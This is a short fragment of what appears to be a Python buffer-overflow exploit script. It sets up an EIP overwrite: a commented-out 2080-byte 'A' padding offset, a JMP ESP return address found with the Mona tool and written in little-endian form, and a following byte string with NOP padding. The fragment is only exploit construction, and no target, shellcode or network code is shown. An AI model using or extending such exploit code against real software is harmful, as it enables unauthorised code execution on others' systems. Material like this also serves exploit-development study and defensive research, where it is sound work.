...
try:
    ...
    # msfOffset = "A"*2080
    # EIP is replaced with a Return Address, in this case JMP ESP that points to the ESP Register: 0x14 80 11 3D in Endian Format. Found with Mona.
    eip = "\x3D\x11\x80\x14"
    esp = "\xff\xe1\x90\x90\x90\x90\x90\x90"
